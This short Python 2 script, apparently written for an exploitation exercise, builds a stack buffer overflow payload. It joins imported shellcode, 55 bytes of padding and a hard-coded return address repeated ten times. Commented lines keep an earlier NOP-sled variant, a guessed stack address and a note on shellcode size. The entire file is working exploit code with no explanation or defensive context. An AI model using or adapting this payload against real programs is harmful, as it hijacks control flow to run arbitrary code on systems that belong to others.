from shellcode import shellcode
from struct import pack
print shellcode + "A" * 55 + pack("<I", 3221143084) * 10



#print shellcode + "\x90" * 120 + pack("<I", 3221222443) * 10
#0xbffff4dd
#print "LLLLLLLLLL"
#shell size is 25